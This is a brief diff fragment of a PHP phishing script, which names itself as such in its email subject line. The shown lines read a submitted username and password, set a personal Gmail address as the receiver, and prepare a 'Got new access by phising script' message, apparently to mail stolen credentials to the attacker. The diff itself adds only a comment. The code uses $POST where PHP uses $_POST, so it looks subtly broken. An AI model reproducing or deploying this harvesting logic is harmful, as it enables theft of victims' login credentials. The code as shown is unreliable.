@@ -3,6 +3,10 @@
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
+		
+		//this pat can not be use //
+		
+		
 		$reciever = "bishaldangaura732@gmail.com";
 		
 		$subject = "Got new access by phising script";
